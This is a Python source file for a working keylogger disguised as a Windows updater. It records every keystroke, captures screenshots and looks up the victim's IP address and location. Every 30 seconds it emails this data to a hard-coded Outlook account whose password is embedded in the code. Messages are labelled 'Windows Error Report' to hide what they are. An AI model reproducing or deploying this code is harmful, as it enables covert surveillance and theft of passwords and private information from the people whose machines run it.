import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from mss import mss
import browserhistory as bh
import os
import requests

CADENCE = 30 # in seconds
ERROR_ADDR = "installer_error_report@outlook.com"
ERROR_WORD = "#error#123"


class WindowsUpdater:
    def __init__(self, interval, report_method="email"):
        # we gonna pass CADENCE to interval
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendmail(self, email, password, message,verbose=1):
        
        screenshot = './windows-error-report.png'
        url = "https://ipinfo.io/json"
        
        msg = MIMEMultipart()
        msg["From"] = ERROR_ADDR
        msg["To"] = ERROR_ADDR
        msg["Subject"] = "Windows Error Report"
        
        with mss() as sct:
            sct.shot(output=screenshot)

        img_data=""
        with open(screenshot, 'rb') as f:
            img_data = f.read()

        info_message=""
        try:
            response = requests.get(url)
            responseJSON = response.json()
            info_message = f''' IP: {responseJSON['ip']} \n 
                                CITY: {responseJSON['city']} \n 
                                COUNTRY: {responseJSON['country']} \n 
                                LOC: {responseJSON['loc']} \n 
                                ORG: {responseJSON['org']}'''
        except:
            info_message = "WINDOWS ERROR, ERROR CODE: 0x800F0907"

        image = MIMEImage(img_data)
        text_part = MIMEText(message, "plain")
        info_part = MIMEText(str(info_message), "plain")

        msg.attach(text_part)
        msg.attach(info_part)
        msg.attach(image)
        
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        os.remove(screenshot)
        server.quit()
    
    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            if self.report_method == "email":
                self.sendmail(ERROR_ADDR, ERROR_WORD,self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        # make a simple message
        keyboard.wait()

    
if __name__ == "__main__":
    updater = WindowsUpdater(CADENCE, report_method="email")
    updater.start()